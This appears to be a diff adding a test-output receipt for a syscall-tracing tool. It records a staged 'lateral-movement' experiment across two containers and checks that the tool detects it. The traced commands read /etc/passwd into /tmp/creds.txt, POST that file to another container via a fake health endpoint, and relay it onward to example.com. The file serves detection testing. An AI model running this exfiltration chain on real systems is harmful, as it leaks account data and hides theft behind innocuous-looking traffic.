@@ -1,0 +1,91 @@
+=== Agent Container (A) ===
+=== Action 1 Receipt ===
+=== Post-Action Receipt: Action #1 ===
+Command: bash: cat /etc/passwd && cat /etc/hostname
+Duration: 2.2s | 12 syscall events
+
+PROCESSES: 3 unique, 0 forked, 0 exited
+  [sh:2626088] $ sh -c \n    cat /etc/passwd > /tmp/creds.txt\n    cat /etc/hostname >> /tmp/creds.txt\n
+  [cat:2626094] $ cat /etc/passwd
+  [cat:2626095] $ cat /etc/hostname
+
+DATA FLOWS:
+  sh:2626088 -> cat:2626094, cat:2626095 (fork)
+  cat:2626095 reads /etc/hostname
+  cat:2626094 reads /etc/passwd
+  sh:2626088 reads /tmp/creds.txt
+  sh:2626088 writes /tmp/creds.txt
+  curl:2626132 [pre-existing] influenced by sh:2626088 via file
+
+
+
+=== Action 2 Receipt ===
+=== Post-Action Receipt: Action #2 ===
+Command: bash: curl -X POST http://172.17.0.3:8080/health -d @/tmp/creds.txt
+Duration: 3.3s | 22 syscall events
+
+PROCESSES: 2 unique, 0 forked, 0 exited
+  [sh:2626126] $ sh -c \n    curl -sf -X POST http://172.17.0.3:8080/health         -H 'Content-Type: application/json'         -d @/tmp/creds.txt\n
+  [curl:2626132] $ curl -sf -X POST http://172.17.0.3:8080/health -H Content-Type: application/json -d @/tmp/creds.txt
+
+DATA FLOWS:
+  sh:2626088 (action #1) wrote /tmp/creds.txt -> curl:2626132 reads
+  sh:2626126 -> curl:2626132 (fork)
+  curl:2626132 reads /etc/passwd, /etc/ssl/openssl.cnf
+  curl:2626132 connects 172.17.0.3:8080 (container 54a6a1d3125b)
+
+SEMANTIC SUMMARY:
+  Action #2:
+    ! [T1105] Curl/wget download: curl -sf -X POST http://172.17.0.3:8080/health -H Content-Type: app...
+    . [T1071] Outbound network connection: 172.17.0.3:8080
+
+
+
+=== Service Container (B): 54a6a1d3125b (IP: 172.17.0.3) ===
+=== Post-Action Receipt: Action #0 ===
+Command: (container lifecycle)
+Duration: 5.4s | 225 syscall events
+
+PROCESSES: 2 unique, 0 forked, 0 exited
+  [python3:2626029] $ python3 /app/service.py
+  [curl:2626133] $ curl -sf -X POST -d @/tmp/received.json http://example.com/api/sync
+
+DATA FLOWS:
+  python3:2626029 -> curl:2626133 (fork)
+  python3:2626029 reads /app/service.py, /etc/hosts, /tmp/received.json, app
+  curl:2626133 reads /etc/passwd, /etc/ssl/openssl.cnf, /etc/{hosts,nsswitch.conf,resolv.conf}, /tmp/received.json
+  python3:2626029 writes /tmp/received.json
+  curl:2626133 connects 10.11.12.1:53, 104.18.26.120:80, 104.18.27.120:80, [2606:4700::6812:1a78]:80, [2606:4700::6812:1b78]:80
+  python3:2626029 listens 0.0.0.0:8080
+
+OK: /etc/passwd access detected in Action 1
+OK: network connection in Action 2
+OK: connection to service IP 172.17.0.3 detected
+OK: cross-container annotation found (container 54a6a1d3125b)
+OK: creds.txt data flow detected
+=== Experiment Receipt (exp-1) ===
+=== Experiment Receipt: lateral-movement-test ===
+Containers: 2
+
+── Container e1c7611cea1e ──
+  2 actions, 6 processes, 34 events
+  Action #1: bash: cat /etc/passwd && cat /etc/hostname (12 events)
+  Action #2: bash: curl -X POST http://172.17.0.3:8080/health -d @/tmp/creds.txt (22 events)
+
+── Container 54a6a1d3125b ──
+  0 actions, 2 processes, 0 events
+
+CROSS-CONTAINER FLOWS:
+  curl:2626132 [e1c7611cea1e] -> 172.17.0.3:8080 [54a6a1d3125b]
+
+NETWORK [e1c7611cea1e]:
+  curl:2626132 [e1c7611cea1e] connects 172.17.0.3:8080 (container 54a6a1d3125b)
+
+NETWORK [54a6a1d3125b]:
+  curl:2626133 [54a6a1d3125b] connects 10.11.12.1:53
+  curl:2626133 [54a6a1d3125b] connects 104.18.26.120:80
+  curl:2626133 [54a6a1d3125b] connects 104.18.27.120:80
+  curl:2626133 [54a6a1d3125b] connects [2606:4700::6812:1a78]:80
+  curl:2626133 [54a6a1d3125b] connects [2606:4700::6812:1b78]:80
+OK: cross-container flows section in experiment receipt
+
